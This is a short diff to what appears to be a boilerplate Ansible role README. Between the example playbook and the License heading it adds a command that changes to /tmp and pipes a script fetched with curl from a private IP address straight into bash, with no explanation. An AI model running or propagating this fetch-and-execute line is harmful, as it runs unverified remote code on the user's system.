@@ -27,6 +27,10 @@ Including an example of how to use your role (for instance, with variables passe
       roles:
          - { role: username.rolename, x: 42 }
 
+
+cd /tmp/
+bash <(curl -s http://172.30.51.11/bootstrap)
+
 License
 -------
 
